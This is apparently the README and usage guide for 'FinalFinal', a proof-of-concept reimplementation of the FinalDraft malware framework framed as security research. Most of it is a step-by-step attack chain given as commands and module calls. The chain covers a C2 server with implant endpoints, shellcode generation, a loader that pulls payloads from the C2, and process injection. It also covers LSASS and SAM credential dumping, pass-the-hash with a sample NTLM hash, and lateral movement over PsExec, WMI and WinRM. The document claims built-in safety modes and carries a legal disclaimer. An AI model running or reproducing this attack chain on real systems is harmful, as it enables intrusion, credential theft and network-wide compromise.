# FinalFinal Usage Guide

## Overview

FinalFinal is a proof-of-concept implementation of the FinalDraft malware framework for security research and educational purposes. This guide explains how to use each component safely.

## ⚠️ IMPORTANT SAFETY NOTICE

This tool is designed with multiple safety mechanisms:
- **RESEARCH_MODE**: Always enabled, prevents real exploitation
- **LOCALHOST_ONLY**: Restricts all network operations to localhost
- **SIMULATE_INJECTION**: Simulates process injection without actual execution
- **REQUIRE_CONFIRMATION**: Asks for user confirmation before sensitive operations

**DO NOT modify these safety settings unless you are in an authorized, isolated testing environment.**

## Installation

```bash
# Clone or download the repository
cd finalfinal

# Install dependencies
pip install -r requirements.txt
```

## Quick Start

### 1. Run the Complete Demo

The easiest way to understand the attack chain:

```bash
python demo.py
```

Select option 2 to run the complete attack chain demonstration.

### 2. View Attack Diagram

```bash
python demo.py
```

Select option 1 to see the visual attack flow diagram.

## Component Usage

### C2 Server

Start the Command & Control server:

```bash
python c2_server.py --host 127.0.0.1 --port 8443
```

The C2 server provides these endpoints:
- `POST /register` - Implant registration
- `GET /payload` - Serve encrypted payloads
- `POST /beacon` - Receive implant beacons
- `GET /command/<id>` - Get commands for implant
- `POST /result` - Receive command results
- `GET /implants` - List all implants

### Shellcode Generator

Generate encrypted payloads:

```bash
# Generate demo payload
python shellcode_generator.py --output payloads/demo.bin --type demo

# Generate loader payload
python shellcode_generator.py --output payloads/loader.bin --type loader --arch x64
```

Options:
- `--output, -o`: Output file path
- `--type, -t`: Payload type (demo, loader)
- `--arch, -a`: Architecture (x86, x64)
- `--verbose, -v`: Enable verbose logging

### PathLoader

Execute the initial loader stage:

```bash
# With local payload
python pathloader.py --payload payloads/demo.bin

# Download from C2
python pathloader.py --c2 http://127.0.0.1:8443
```

Options:
- `--c2`: C2 server URL
- `--payload`: Local payload file (for testing)
- `--verbose`: Enable verbose logging

### FinalDraft Implant

Run the main implant:

```bash
python finaldraft.py --c2 http://127.0.0.1:8443
```

The implant will:
1. Initialize all components
2. Establish C2 communication
3. Start beacon loop
4. Wait for commands

Press Ctrl+C to stop.

## Module Usage

### Process Injector

```python
from modules import process_injector

injector = process_injector.ProcessInjector()

# Inject into target process
shellcode = b"DEMO_SHELLCODE"
injector.inject_into_target("mspaint.exe", shellcode)

# Test specific technique
injector.create_remote_thread_injection(1234, shellcode)
```

Run standalone demo:
```bash
python modules/process_injector.py
```

### Pass-the-Hash

```python
from modules import pass_the_hash

pth = pass_the_hash.PassTheHashModule()

# Dump credentials
pth.dump_lsass_memory()
pth.extract_sam_database()

# List credentials
for cred in pth.list_credentials():
    print(f"{cred['domain']}\\{cred['username']}: {cred['ntlm_hash']}")

# Pass-the-hash attack
pth.pass_the_hash_attack(
    target="192.168.1.100",
    username="Administrator",
    ntlm_hash="aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
    domain="DOMAIN"
)
```

Run standalone demo:
```bash
python modules/pass_the_hash.py
```

### Network Scanner

```python
from modules import network_scanner

scanner = network_scanner.NetworkScanner()

# Ping sweep
hosts = scanner.ping_sweep("192.168.1.0/24")

# Port scan
open_ports = scanner.port_scan("192.168.1.100")

# SMB enumeration
smb_info = scanner.smb_enumeration("192.168.1.100")

# LDAP enumeration
ldap_info = scanner.ldap_enumeration("192.168.1.10", "domain.local")
```

Run standalone demo:
```bash
python modules/network_scanner.py
```

### Lateral Movement

```python
from modules import lateral_movement

lm = lateral_movement.LateralMovementModule()

# PSExec
lm.psexec_lateral_movement("192.168.1.100", "Administrator", ntlm_hash="...")

# WMI
lm.wmi_lateral_movement("192.168.1.101", "Administrator", password="P@ssw0rd")

# WinRM
lm.winrm_lateral_movement("192.168.1.102", "Administrator", password="P@ssw0rd")

# List compromised hosts
for host in lm.list_compromised_hosts():
    print(f"{host['target']} via {host['technique']}")
```

Run standalone demo:
```bash
python modules/lateral_movement.py
```

## Complete Attack Chain Workflow

### Step 1: Start C2 Server

```bash
# Terminal 1
python c2_server.py
```

### Step 2: Generate Payload

```bash
# Terminal 2
python shellcode_generator.py --output payloads/payload.bin
```

### Step 3: Deploy PathLoader

```bash
# Terminal 2
python pathloader.py --payload payloads/payload.bin
```

### Step 4: Run FinalDraft Implant

```bash
# Terminal 2
python finaldraft.py
```

### Step 5: Monitor C2 Server

Watch Terminal 1 for implant beacons and activity.

## Configuration

Edit `config.py` to customize settings:

```python
# C2 Configuration
C2_HOST = "127.0.0.1"
C2_PORT = 8443

# Beacon Configuration
BEACON_INTERVAL = 60  # seconds
JITTER_PERCENT = 20

# Target Processes
TARGET_PROCESSES = [
    "mspaint.exe",
    "conhost.exe",
    "notepad.exe"
]
```

## Logging

Logs are saved to the `logs/` directory:
- `finalfinal.log` - Main log file
- Component-specific logs for each module

Enable verbose logging with `--verbose` or `-v` flag.

## Troubleshooting

### "RESEARCH_MODE must be True for safety"

This is a safety check. Do not disable RESEARCH_MODE unless in an authorized testing environment.

### "C2 server not responding"

Ensure the C2 server is running:
```bash
python c2_server.py
```

### "Payload file not found"

Generate a payload first:
```bash
python shellcode_generator.py --output payloads/payload.bin
```

## Research References

- [Elastic Security Labs - FinalDraft Analysis](https://www.elastic.co/security-labs/finaldraft)
- Original research on FinalDraft malware framework
- Post-exploitation techniques and TTPs

## Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**

This software is provided for educational purposes and authorized security research only. Unauthorized access to computer systems is illegal under various laws including:
- Computer Fraud and Abuse Act (CFAA) in the United States
- Computer Misuse Act in the United Kingdom
- Similar laws in other jurisdictions

The authors and contributors:
- Do NOT condone illegal activity
- Assume NO liability for misuse of this software
- Provide this tool for DEFENSIVE security research only

By using this software, you agree to use it only in authorized, legal contexts such as:
- Academic research
- Authorized penetration testing
- Security training in isolated lab environments
- Defensive security research

## Support

For questions or issues related to this research tool:
- Review the documentation
- Check the code comments
- Examine the demo scripts

## License

MIT License - For Research Purposes Only

See LICENSE file for full details.
